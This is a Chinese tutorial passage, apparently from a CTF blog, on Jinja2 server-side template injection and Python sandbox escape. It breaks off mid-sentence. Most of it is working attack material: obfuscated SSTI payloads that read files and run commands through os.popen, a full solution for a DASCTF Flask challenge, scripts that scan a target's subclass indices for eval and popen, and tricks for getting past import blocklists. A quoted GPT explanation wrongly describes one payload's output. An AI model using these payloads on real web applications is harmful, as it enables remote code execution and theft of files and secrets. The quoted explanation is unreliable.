cc=(dict(ee=a)|join|count)%&#125;&#123;% set ccc=(dict(eee=a)|join|count)%&#125;&#123;% set cccc=(dict(eeee=a)|join|count)%&#125;&#123;% set ccccccc=(dict(eeeeeee=a)|join|count)%&#125;&#123;% set cccccccc=(dict(eeeeeeee=a)|join|count)%&#125;&#123;% set ccccccccc=(dict(eeeeeeeee=a)|join|count)%&#125;&#123;% set cccccccccc=(dict(eeeeeeeeee=a)|join|count)%&#125;&#123;% set coun=(cc~cccc)|int%&#125;&#123;% set po=dict(po=a,p=a)|join%&#125;&#123;% set a=(()|select|string|list)|attr(po)(coun)%&#125;&#123;% set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125;&#123;% set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125;&#123;% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%&#125;&#123;% set built=(a,a,dict(builtins=a)|join,a,a)|join()%&#125;&#123;% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;&#123;% set chr=x.chr%&#125;&#123;% setfile=chr((cccc~ccccccc)|int)%2bchr((cccccccccc~cc)|int)%2bchr((cccccccccc~cccccccc)|int)%2bchr((ccccccccc~ccccccc)|int)%2bchr((cccccccccc~ccc)|int)%&#125;&#123;%print(x.open(file).read())%&#125;\n使用 Jinja2 过滤器绕过\n在 JinJa2 中内置了很多过滤器，变量可以通过过滤器进行修改，过滤器与变量之间用管道符号|隔开，括号中可以有可选参数，也可以没有参数，过滤器函数可以带括号也可以不带括号。可以使用管道符号|连接多个过滤器，一个过滤器的输出应用于下一个过滤器。\n内置过滤器列表如下：\n\n\n\nabs()\nforceescape()\nmap()\nselect()\nunique()\n\n\n\n\nattr()\nformat()\nmax()\nselectattr()\nupper()\n\n\nbatch()\ngroupby()\nmin()\nslice()\nurlencode()\n\n\ncapitalize()\nindent()\npprint()\nsort()\nurlize()\n\n\ncenter()\nint()\nrandom()\nstring()\nwordcount()\n\n\ndefault()\nitems()\nreject()\nstriptags()\nwordwrap()\n\n\ndictsort()\njoin()\nrejectattr()\nsum()\nxmlattr()\n\n\nescape()\nlast()\nreplace()\ntitle()\nfilesizeformat()\n\n\nlength()\nreverse()\ntojson()\nfirst()\nlist()\n\n\nround()\ntrim()\nfloat()\nlower()\nsafe()\n\n\ntruncate()\n\n\n\n\n\n\n\n其中常见过滤器用法如下：\n\nabs()\n  返回参数的绝对值。\nattr()\n  获取对象的属性。foo|attr(“bar”) 等价于 foo.bar\ncapitalize()\n  第一个字符大写，所有其他字符小写。\nfirst()\n  返回序列的第一项。\nfloat()\n  将值转换为浮点数。如果转换不起作用将返回 0.0。\nint()\n  将值转换为整数。如果转换不起作用将返回 0。\nitems()\n  返回一个迭代器(key, value)映射项。\n\n其他用法详见官方文档：\nTemplate Designer Documentation - Jinja Documentation (3.2.x)\n使用过滤器构造Payload，一般思路是利用这些过滤器，逐步拼接出需要的字符、数字或字符串。对于一般原始字符的获取方法有以下几种：\n&#123;% set org = (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org&#125;&#125;# &lt;generator object select_or_reject at 0x0000020B2CA4EA20&gt;&#123;% set org = (self|string()) %&#125;&#123;&#123;org&#125;&#125;# &lt;TemplateReference None&gt;&#123;% set org = self|string|urlencode %&#125;&#123;&#123;org&#125;&#125;# %3CTemplateReference%20None%3E&#123;% set org = (app.__doc__|string) %&#125;&#123;&#123;org&#125;&#125;# Hello The default undefined type.  This undefined type can be printed and#    iterated over, but every other access will raise an :exc:`UndefinedError`:##     &gt;&gt;&gt; foo = Undefined(name=&#x27;foo&#x27;)#     &gt;&gt;&gt; str(foo)#     &#x27;&#x27;#     &gt;&gt;&gt; not foo#     True#     &gt;&gt;&gt; foo + 42#     Traceback (most recent call last):#       ...#     jinja2.exceptions.UndefinedError: &#x27;foo&#x27; is undefined&#123;% set num = (self|int) %&#125;&#123;&#123;num&#125;&#125;# 0&#123;% set num = (self|string|length) %&#125;&#123;&#123;num&#125;&#125;# 24&#123;% set point = self|float|string|min %&#125;&#123;&#123;point&#125;&#125;# .\n通过以上几种Payload，返回的字符串中包含尖括号、字母、空格、下划线、数字、空格、百分号、点号。\n我们的目标就是使用这些返回的字符串，结合各种过滤器，拼接出最终的Payload。\nGPT代码解释\n这段代码是使用Jinja2模板语言的语法。让我逐步解释它的含义：1. `&#123;% set org = ... %&#125;`: 这是Jinja2的赋值语句。它创建了一个名为&quot;org&quot;的变量，并将其赋值为接下来表达式的结果。2. `(&#123; &#125;|select()|string())`: 这是一个表达式，由几个操作符组成。   - `&#123; &#125;`：这是一个空的字典对象。   - `select()`：这是Jinja2的过滤器(filter)函数之一。`select()`函数用于选择字典中的项，但在这个例子中，字典是空的，所以它实际上没有进行任何选择。   - `string()`：这是Jinja2的过滤器函数之一。`string()`函数将其输入转换为字符串类型。3. `&#123;&#123;org&#125;&#125;`: 这是Jinja2的输出表达式。它会在模板中显示变量&quot;org&quot;的值。综上所述，这段代码的作用是创建一个名为&quot;org&quot;的变量，并将其赋值为空字典经过选择和字符串转换后的结果。然后，它将&quot;org&quot;的值输出到模板中。由于选择和字符串转换操作并未改变空字典的内容，因此最终输出的结果将是一个空字符串。\n实战演示\n[2020 DASCTF 八月安恒月赛]ezflask\n题目源码：\n#!/usr/bin/env python# -*- coding: utf-8 -*-from flask import Flask, render_template, render_template_string, redirect, request, session, abort, send_from_directoryapp = Flask(__name__)@app.route(&quot;/&quot;)def index():    def safe_jinja(s):        blacklist = [&#x27;class&#x27;, &#x27;attr&#x27;, &#x27;mro&#x27;, &#x27;base&#x27;,                     &#x27;request&#x27;, &#x27;session&#x27;, &#x27;+&#x27;, &#x27;add&#x27;, &#x27;chr&#x27;, &#x27;ord&#x27;, &#x27;redirect&#x27;, &#x27;url_for&#x27;, &#x27;config&#x27;, &#x27;builtins&#x27;, &#x27;get_flashed_messages&#x27;, &#x27;get&#x27;, &#x27;subclasses&#x27;, &#x27;form&#x27;, &#x27;cookies&#x27;, &#x27;headers&#x27;, &#x27;[&#x27;, &#x27;]&#x27;, &#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;&#123;&#125;&#x27;]        flag = True        for no in blacklist:            if no.lower() in s.lower():                flag = False                break        return flag    if not request.args.get(&#x27;name&#x27;):        return open(__file__).read()    elif safe_jinja(request.args.get(&#x27;name&#x27;)):        name = request.args.get(&#x27;name&#x27;)    else:        name = &#x27;wendell&#x27;    template = &#x27;&#x27;&#x27;    &lt;div class=&quot;center-content&quot;&gt;        &lt;p&gt;Hello, %s&lt;/p&gt;    &lt;/div&gt;    &lt;!--flag in /flag--&gt;    &lt;!--python3.8--&gt;&#x27;&#x27;&#x27; % (name)    return render_template_string(template)if __name__ == &quot;__main__&quot;:    app.run(host=&#x27;0.0.0.0&#x27;, port=5000)\n可以看到题目过滤的死死地，最关键是把attr也给过滤了的话，这就很麻烦了，但是我们还可以用过滤器进行绕过。\n在存在ssti的地方执行如下payload：\n&#123;% set org = (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org&#125;&#125;# 或 &#123;% set org = (&#123; &#125;|select|string) %&#125;&#123;&#123;org&#125;&#125;\n\n可以看到，我们得到了一段字符串：&lt;generator object select_or_reject at 0x7f06771f4150&gt;，这段字符串中不仅存在字符，还存在空格、下划线，尖号和数字。也就是说，如果题目过滤了这些字符的话，我们便可以在 &lt;generator object select_or_reject at 0x7f06771f4150&gt; 这个字符串中取到我们想要的字符，从而绕过过滤。\n然后我们在使用list()过滤器将字符串转化为列表：\n&#123;% set orglst = (&#123; &#125;|select|string|list) %&#125;&#123;&#123;orglst&#125;&#125;\n\n如上图所示，反回了一个列表，列表中是 &lt;generator object select_or_reject at 0x7f06771f4150&gt; 这个字符串的每一个字符。接下来我们便可以使用使用pop()等方法将列表里的字符取出来了。如下所示，我们取一个下划线 _：\n&#123;% set xhx = ((&#123; &#125;|select|string|list).pop(24)|string) %&#125;&#123;&#123;xhx&#125;&#125;    # _\n\n同理还能取到更多的字符：\n&#123;% set space = ((&#123; &#125;|select|string|list).pop(10)|string) %&#125;&#123;&#123;spa&#125;&#125;    # 空格&#123;% set xhx = ((&#123; &#125;|select|string|list).pop(24)|string) %&#125;&#123;&#123;xhx&#125;&#125;    # _&#123;% set zero = ((&#123; &#125;|select|string|list).pop(38)|int) %&#125;&#123;&#123;zero&#125;&#125;    # 0&#123;% set seven = ((&#123; &#125;|select|string|list).pop(40)|int) %&#125;&#123;&#123;seven&#125;&#125;    # 7......\n这里，其实有了数字0之后，我们便可以依次将其余的数字全部构造出来，原理就是加减乘除、平方等数学运算，如下示例：\n&#123;% set zero = ((&#123; &#125;|select|string|list).pop(38)|int) %&#125;    # 0&#123;% set one = (zero**zero)|int %&#125;&#123;&#123;one&#125;&#125;    # 1&#123;%set two = (zero-one-one)|abs %&#125;    # 2&#123;%set three = (zero-one-one-one)|abs %&#125;    # 3&#123;% set five = (two*two*two)-one-one-one %&#125;    # 5#  &#123;%set four = (one+three) %&#125;    注意, 这样的加号的是不行的,不知道为什么,只能用减号配合abs取绝对值了......\n\n通过上述原理，我们可以依次获得构造payload所需的特殊字符与字符串：\n# 首先构造出所需的数字:&#123;% set zero = ((&#123; &#125;|select|string|list).pop(38)|int) %&#125;    # 0&#123;% set one = (zero**zero)|int %&#125;    # 1&#123;% set two = (zero-one-one)|abs %&#125;    # 2&#123;% set four = (two*two)|int %&#125;    # 4&#123;% set five = (two*two*two)-one-one-one %&#125;    # 5&#123;% set seven = (zero-one-one-five)|abs %&#125;    # 7# 构造出所需的各种字符与字符串:&#123;% set xhx = ((&#123; &#125;|select|string|list).pop(24)|string) %&#125;    # _&#123;% set space = ((&#123; &#125;|select|string|list).pop(10)|string) %&#125;    # 空格&#123;% set point = ((app.__doc__|string|list).pop(26)|string) %&#125;    # .&#123;% set yin = ((app.__doc__|string|list).pop(195)|string) %&#125;    # 单引号 &#x27;&#123;% set left = ((app.__doc__|string|list).pop(189)|string) %&#125;    # 左括号 (&#123;% set right = ((app.__doc__|string|list).pop(200)|string) %&#125;    # 右括号 )&#123;% set c = dict(c=aa)|reverse|first %&#125;    # 字符 c&#123;% set bfh = self|string|urlencode|first %&#125;    # 百分号 %&#123;% set bfhc=bfh~c %&#125;    # 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接&#123;% set slas = bfhc%((four~seven)|int) %&#125;    # 使用%c构造斜杠 /&#123;% set but = dict(buil=aa,tins=dd)|join %&#125;    # builtins&#123;% set imp = dict(imp=aa,ort=dd)|join %&#125;    # import&#123;% set pon = dict(po=aa,pen=dd)|join %&#125;    # popen&#123;% set os = dict(o=aa,s=dd)|join %&#125;    # os&#123;% set ca = dict(ca=aa,t=dd)|join %&#125;    # cat&#123;% set flg = dict(fl=aa,ag=dd)|join %&#125;    # flag&#123;% set ev = dict(ev=aa,al=dd)|join %&#125;    # eval&#123;% set red = dict(re=aa,ad=dd)|join %&#125;    # read&#123;% set bul = xhx*2~but~xhx*2 %&#125;    # __builtins__\n将上面构造的字符或字符串拼接起来构造出 __import__('os').popen('cat /flag').read()：\n&#123;% set pld = xhx*2~imp~xhx*2~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;\n\n如上图所示，成功构造出了 __import__('os').popen('cat /flag').read() 。\n然后将上面构造的各种变量添加到SSTI万能payload里面就行了：\n&#123;% for f,v in whoami.__init__.__globals__.items() %&#125;    # globals    &#123;% if f == bul %&#125;         &#123;% for a,b in v.items() %&#125;    # builtins            &#123;% if a == ev %&#125;    # eval                &#123;&#123;b(pld)&#125;&#125;    # eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)            &#123;% endif %&#125;        &#123;% endfor %&#125;    &#123;% endif %&#125;&#123;% endfor %&#125;\n所以最终的payload为：\n&#123;% set zero = ((&#123; &#125;|select|string|list).pop(38)|int) %&#125;&#123;% set one = (zero**zero)|int %&#125;&#123;% set two = (zero-one-one)|abs|int %&#125;&#123;% set four = (two*two)|int %&#125;&#123;% set five = (two*two*two)-one-one-one %&#125;&#123;% set seven = (zero-one-one-five)|abs %&#125;&#123;% set xhx = ((&#123; &#125;|select|string|list).pop(24)|string) %&#125;&#123;% set space = ((&#123; &#125;|select|string|list).pop(10)|string) %&#125;&#123;% set point = ((app.__doc__|string|list).pop(26)|string) %&#125;&#123;% set yin = ((app.__doc__|string|list).pop(195)|string) %&#125;&#123;% set left = ((app.__doc__|string|list).pop(189)|string) %&#125;&#123;% set right = ((app.__doc__|string|list).pop(200)|string) %&#125;&#123;% set c = dict(c=aa)|reverse|first %&#125;&#123;% set bfh=self|string|urlencode|first %&#125;&#123;% set bfhc=bfh~c %&#125;&#123;% set slas = bfhc%((four~seven)|int) %&#125;&#123;% set but = dict(buil=aa,tins=dd)|join %&#125;&#123;% set imp = dict(imp=aa,ort=dd)|join %&#125;&#123;% set pon = dict(po=aa,pen=dd)|join %&#125;&#123;% set os = dict(o=aa,s=dd)|join %&#125;&#123;% set ca = dict(ca=aa,t=dd)|join %&#125;&#123;% set flg = dict(fl=aa,ag=dd)|join %&#125;&#123;% set ev = dict(ev=aa,al=dd)|join %&#125;&#123;% set red = dict(re=aa,ad=dd)|join %&#125;&#123;% set bul = xhx*2~but~xhx*2 %&#125;&#123;% set pld = xhx*2~imp~xhx*2~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;&#123;% for f,v in whoami.__init__.__globals__.items() %&#125;&#123;% if f == bul %&#125;&#123;% for a,b in v.items() %&#125;&#123;% if a == ev %&#125;&#123;&#123;b(pld)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n\n参考：https://xz.aliyun.com/t/9584\n2.6 一些姿势\n1. config\n&#123;&#123;config&#125;&#125; 可以获取当前设置，如果题目类似 app.config [&#x27;FLAG&#x27;] =os.environ.pop（&#x27;FLAG&#x27;） ，那可以直接访问 &#123;&#123;config[&#x27;FLAG&#x27;]&#125;&#125; 或者 &#123;&#123;config.FLAG&#125;&#125; 得到flag\n2. self\n&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference None&gt;&#123;&#123;self.__dict__._TemplateReference__context.config&#125;&#125; ⇒ 同样可以找到config\n3.  “” 、 [] 、 () 等数据结构\n主要目的是配合 __class__.__mro__[2] 这样找到 object 类&#123;&#123;[].__class__.__base__.__subclasses__()[68].__init__.__globals__[&#x27;os&#x27;].__dict__.environ[&#x27;FLAG&#x27;]\n4、url_for, g, request, namespace, lipsum, range, session, dict,get_flashed_messages, cycler, joiner, config等\n如果config，self不能使用，要获取配置信息，就必须从它的上部全局变量（访问配置current_app\n等）。\n例如：\n&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config.FLAG&#125;&#125;&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config.FLAG&#125;&#125;&#123;&#123;request.application.__self__._get_data_for_json.__globals__[&#x27;json&#x27;].JSONEncoder.default.__globals__[&#x27;current_app&#x27;].config[&#x27;FLAG&#x27;]&#125;&#125;\n5. 在URL执行py命令格式\n&#123;%这是内容%&#125;eg:&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;file&#x27; %&#125;&#123;&#123; c(&quot;/etc/passwd&quot;).readlines() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n2.7 常用到的payload\nname=&#123;&#123;().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;   //132是os模块name=&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat ../flag&#x27;).read() &#125;&#125;   //大佬经常用的config直接出在导入不了具体哪个子类例如132的时候，可以用__bulit__重新导入Os模块然后进行命令执行name=&#123;&#123;x.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;)&#125;&#125;当然如果遇到过了了敏感字符，记得自己去拼接一下\n注入顺序：先找到一个类型所属的对象–&gt;在找到这个对象所继承的基类–&gt;他的功能是谁传授给他的(‘找到他父亲’)–&gt;他父亲除了有这个子类，还有其他的子类呗，这里的类，就包括很多的方法了，比如我们最需要用到的就是，OS模块来命令执行–&gt;找到OS类了，将这个类初始化成方法，相当于我们调用了OS模块–&gt;通过globals保存对全局变量的引用，然后再用OS模块进行命令执行\nSSTI常用的语句格式\n&#123;&#123;5*5&#125;&#125; 直接执行&#123;% set a=&quot;test&quot; %&#125;&#123;&#123;a&#125;&#125;      //设置变量&#123;% for i in [&#x27;t &#x27;,&#x27;e &#x27;,&#x27;s &#x27;,&#x27;t &#x27;] %&#125;&#123;&#123;i&#125;&#125;&#123;%endfor%&#125;  //执行循环  --&gt;别忘了中间那个&#123;&#123;i&#125;&#125;&#123;% if 25==5*5 %&#125;&#123;&#123;&quot;success&quot;&#125;&#125;&#123;% endif %&#125;  //条件执行\n绕过SSTI过滤\n再读了一部分的文章，再结合自己的做题情况来看，对SSTI考点总结如下：\n1.过滤一些字符–&gt;绕过即可2.寻找模块进行命令执行主要是对第一个过滤的考察，比如说：对字符串进行拼接绕过，编码绕过，format、char等绕过拼接，通过getattribute等函数替代符号的效果,通过request的方法进行传参，通过%set的方法我们知道在SSTI中用到的符号无非就是： .   __   ()   []   ‘’   五种\n符号的过滤\n访问变量属性： . [] getattribute标准的python语法使用点（.）外，还可以使用中括号（[]）来访问变量的属性,也可以使用attr来访问变量的属性。\n过滤了点号\n&#123;&#123;().__class__ &#125;&#125;等同于&#123;&#123;()[&#x27;__class__&#x27;]&#125;&#125;\n\n&quot;&quot;|attr(&quot;__class__&quot;)相当于&quot;&quot;.__class__\n过滤了中括号\n还有一些其他的访问方法：pop get getitem:\n&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;]&#125;&#125;&#123;&#123;url_for.__globals__.__getitem__(&#x27;__builtins__&#x27;)&#125;&#125;&#123;&#123;url_for.__globals__.pop(&#x27;__builtins__&#x27;)&#125;&#125;&#123;&#123;url_for.__globals__.get(&#x27;__builtins__&#x27;)&#125;&#125;&#123;&#123;url_for.__globals__.setdefault(&#x27;__builtins__&#x27;)&#125;&#125;\n\n&#123;&#123;&quot;&quot;.class&#125;&#125;==&#123;&#123;&quot;&quot;[[cla,ss]|join]&#125;&#125;   //这是拼接绕过&quot;__cladd__&quot;|replace(&quot;dd&quot;,&quot;ss&quot;)     // &quot;__class__&quot;   //这是替代“ssalc”[::-1]&quot;&quot;[&quot;__ssalc__&quot;][::-1]&quot;&quot;.__getattribute__(&quot;__ssalc__&quot;[::-1])    //这是反转&quot;&quot;[&quot;__CLASS__&quot;.lower()]     //这是大小写转换&quot;__class__&quot;==&quot;\\x5f\\x5fclass\\x5f\\x5f&quot;==&quot;\\x5f\\x5f\\x63\\x6c\\x61\\x73\\x73\\x5f\\x5f&quot;对于python2的话，还可以利用base64进行绕过&quot;__class__&quot;==(&quot;X19jbGFzc19f&quot;).decode(&quot;base64&quot;)        //这是编码绕过\n2.8 脚本\n1. 寻找内建函数 eval 执行命令\nimport requestsheaders = &#123;    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#x27;&#125;for i in range(500):    url = &quot;http://47.xxx.xxx.72:8000/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__[&#x27;__builtins__&#x27;]&#125;&#125;&quot;    res = requests.get(url=url, headers=headers)    if &#x27;eval&#x27; in res.text:        print(i)# 得到一大堆子类的索引:\n我们可以记下几个含有eval函数的类：warnings.catch_warningsWarningMessagecodecs.IncrementalEncodercodecs.IncrementalDecodercodecs.StreamReaderWriteros._wrap_closereprlib.Reprweakref.finalize......\n2. 寻找 os 模块执行命令\nPython的 os 模块中有system和popen这两个函数可用来执行命令。其中system()函数执行命令是没有回显的，我们可以使用system()函数配合curl外带数据；popen()函数执行命令有回显。所以比较常用的函数为popen()函数，而当popen()函数被过滤掉时，可以使用system()函数代替。\n首先编写脚本遍历目标Python环境中含有os模块的类的索引号：\nimport requestsheaders = &#123;    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#x27;&#125;for i in range(500):    url = &quot;http://47.xxx.xxx.72:8000/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__&#125;&#125;&quot;    res = requests.get(url=url, headers=headers)    if &#x27;os.py&#x27; in res.text:        print(i)# 可以得到一大堆类\n但是该方法遍历得到的类不准确，因为一些不相关的类名中也存在字符串 “os”，所以我们还要探索更有效的方法。\n我们可以看到，即使是使用os模块执行命令，其也是调用的os模块中的popen函数，那我们也可以直接调用popen函数，存在popen函数的类一般是 os._wrap_close，但也不绝对。由于目标Python环境的不同，我们还需要遍历一下。\n3. 寻找 popen 函数执行命令\n首先编写脚本遍历目标Python环境中含有 popen 函数的类的索引号：\nimport requestsheaders = &#123;    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#x27;&#125;for i in range(500):    url = &quot;http://47.xxx.xxx.72:8000/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__&#125;&#125;&quot;    res = requests.get(url=url, headers=headers)    if &#x27;popen&#x27; in res.text:        print(i)# 得到编号为\n这样得到的索引还是很准确的。\n除了这种方法外，我们还可以直接导入os模块，python有一个importlib类，可用load_module来导入你需要的模块。\n4. 寻找 importlib 类执行命令\nPython 中存在 &lt;class '_frozen_importlib.BuiltinImporter'&gt; 类，目的就是提供 Python 中 import 语句的实现（以及 __import__ 函数）。我么可以直接利用该类中的load_module将os模块导入，从而使用 os 模块执行命令。\n首先编写脚本遍历目标Python环境中 importlib 类的索引号：\nimport requestsheaders = &#123;    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#x27;&#125;for i in range(500):    url = &quot;http://47.xxx.xxx.72:8000/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;]&#125;&#125;&quot;    res = requests.get(url=url, headers=headers)    if &#x27;_frozen_importlib.BuiltinImporter&#x27; in res.text:        print(i)\n5. 寻找 linecache 函数执行命令\nlinecache 这个函数可用于读取任意一个文件的某一行，而这个函数中也引入了 os 模块，所以我们也可以利用这个 linecache 函数去执行命令。\n首先编写脚本遍历目标Python环境中含有 linecache 这个函数的子类的索引号：\nimport requestsheaders = &#123;    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#x27;&#125;for i in range(500):    url = &quot;http://47.xxx.xxx.72:8000/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__&#125;&#125;&quot;    res = requests.get(url=url, headers=headers)    if &#x27;linecache&#x27; in res.text:        print(i)\n6. 寻找 subprocess.Popen 类执行命令\n从python2.4版本开始，可以用 subprocess 这个模块来产生子进程，并连接到子进程的标准输入/输出/错误中去，还可以得到子进程的返回值。\nsubprocess 意在替代其他几个老的模块或者函数，比如：os.system、os.popen 等函数。\n首先编写脚本遍历目标Python环境中含有 linecache 这个函数的子类的索引号：\nimport requestsheaders = &#123;    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#x27;&#125;for i in range(500):    url = &quot;http://47.xxx.xxx.72:8000/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;]&#125;&#125;&quot;    res = requests.get(url=url, headers=headers)    if &#x27;linecache&#x27; in res.text:        print(i)\n四、沙箱逃逸\n4.1 原理\n沙盒/沙箱\n沙箱在早期主要用于测试可疑软件，测试病毒危害程度等等。在沙箱中运行，即使病毒对其造成了严重\n危害，也不会威胁到真实环境，沙箱重构也十分便捷。有点类似虚拟机的利用。\n沙箱逃逸,就是在给我们的一个代码执行环境下,脱离种种过滤和限制,最终成功拿到shell权限的过程。其\n实就是闯过重重黑名单，最终拿到系统命令执行权限的过程。而我们这里主要讲解的是python环境下的\n沙箱逃逸。\npython的沙箱逃逸就是在一个严格限制的python环境中，通过绕过限制和过滤达到执行更高权限，甚至getshell的过程。\n既然是想getshell，或者说是执行命令就需要一个可执行命令的包。可直接执行命令的模块有\nosptysubprocessplarformcommands\n有些时候，比如CTF，我们并不需要去执行命令，而是去读取目录下的flag文件即可，也就是说需要文件读取的模块来执行，常用的文件读取模块：\nfileopencodecsfileinput\n不过其中file只在python2中执行，左2右3。\n\n4.2 函数导入限制和绕过\n1. import\n一个受限制的环境，禁止导入敏感的包是最常见的方法，所以import一般是最容易被限制掉。\nimport re,syspattern  = re.compile(&#x27;import\\s+(os|subprocess)&#x27;)match = re.search(pattern,sys.args[1])if match:    print &quot;forbidden module import detected&quot;    raise Exception\n这种简单的限制不能导入包的形式，可以中间添加空格来绕过，或者使用其他方式导入包，比如\n__import__importlib\n还可以使用编码的方式绕过对导入包关键字的检查，比如使用base64，python2中适用\n&gt;&gt;&gt; import base64&gt;&gt;&gt; base64.b64encode(&quot;os&quot;)&#x27;b3M=&#x27;&gt;&gt;&gt; flag = __import__(base64.b64decode(&#x27;b3M=&#x27;))&gt;&gt;&gt; flag.system(&#x27;whoami&#x27;)misaki\\user或者&gt;&gt;&gt; import importlib&gt;&gt;&gt; flag = importlib.import_module(&#x27;b3M=&#x27;.decode(&#x27;base64&#x27;))&gt;&gt;&gt; flag.system(&#x27;whoami&#x27;)misaki\\user\n或者使用字符串拼接的方式\n&gt;&gt;&gt; __import__(&#x27;o&#x27;+&#x27;s&#x27;).system(&#x27;who&#x27;+&#x27;ami&#x27;)\n字符串f翻转截取\n&gt;&gt;&gt; __import__(&#x27;so&#x27;[::-1]).system(&#x27;whoami&#x27;)misaki\\user&gt;&gt;&gt; exec(&#x27;)&quot;imaohw&quot;(metsys.so ;so tropmi&#x27;[::-1])misaki\\user\n再万一，他是这么禁止的\nimport re,syspattern  = re.compile(&#x27;import&#x27;)match = re.search(pattern,sys.args[1])if match:    print &quot;forbidden module import detected&quot;    raise Exception\n这样的话，不管怎么换导入函数都会被禁止。那么是否有不直接使用import关键字来导入的方式。既然需要导入也就是只需要能执行对应的库就可以。\n使用execfile，不过在这之前需要判断得到库的物理路径。如果sys模块没被禁用的话，就可以使用sys来获取物理路径。这种方式只能用在python2中，python3取消了execfile\n&gt;&gt;&gt; execfile(&#x27;/usr/lib/python2.7/os.py&#x27;)  #Linux系统下默认路径&gt;&gt;&gt; system(&#x27;whoami&#x27;)misaki\npython3可以利用读取文件，配合exec来执行\n&gt;&gt;&gt; f = open(r&#x27;/usr/lib/python3.6/os.py&#x27;,&#x27;r&#x27;)&gt;&gt;&gt; exec(f.read())&gt;&gt;&gt; system(&#x27;whoami&#x27;)misaki#不可以执行利用exec打开读取，exec需要执行的是其中的内容，直接打开的时候exec执行的就是读取文件操作exec(&quot;open(&#x27;/usr/lib/python3.6/os.py&#x27;,&#x27;r&#x27;).read()&quot;)\n使用with open的形式\n&gt;&gt;&gt; with open(&#x27;/usr/lib/python3.6/os.py&#x27;,&#x27;r&#x27;) as f:...     exec(f.read())...&gt;&gt;&gt; system(&#x27;whoami&#x27;)misaki\n或者使用字符串拼接的方式，但是需要跟exec，eval一起利用。\n&gt;&gt;&gt; exec(&#x27;imp&#x27;+&#x27;ort&#x27;+&#x27; &#x27;+&#x27;os;&#x27;+&#x27;os.system(&quot;whoami&quot;)&#x27;)misaki\\user\n这里exec不需要导入就可以直接引用，当然不需要导入就可以引用的函数不止这一个，因为一个内建函数的原因。\n2. builtins\n__builtins__即时引用，在程序还为执行代码的时候就已经加载进来了。此模块并不需要导入，可以在任何模块中执行引用。比如在python2中\n\n在python3中\n\n所以我们通过dict属性来调用这些函数，例如如下调用exec来执行其中的python语句。\n&gt;&gt;&gt; __builtins__.__dict__[&#x27;exec&#x27;](&quot;print(&#x27;ok&#x27;)&quot;)ok\n通过内建函数来导入包\n&gt;&gt;&gt; __builtins__.__dict__[&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;whoami&#x27;)misaki\\user\n万一跟上面一样，禁用了import，当然还可以使用拼接的方式\n&gt;&gt;&gt; __builtins__.__dict__[&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;os&#x27;).system(&#x27;whoami&#x27;)misaki\\user\n如果在__builtins__中，部分需要引用的函数被删除。不能直接用dict属性来调用，可以使用reload来重新加载\nreload(__builtin__)\n如果仔细看上面的图片就可以看到，在python2中reload也是__builtin__的内建函数。如果此函数被删除在python2中也不可以直接引用了。python3中reload不再是内建函数，3.4之前是imp模块下的函数，而之后是importlib模块下的函数。\n所以可以直接利用imp模块来导入，python2也可以利用。\n&gt;&gt;&gt; import imp&gt;&gt;&gt; imp.reload(__builtins__)&lt;module &#x27;__builtin__&#x27; 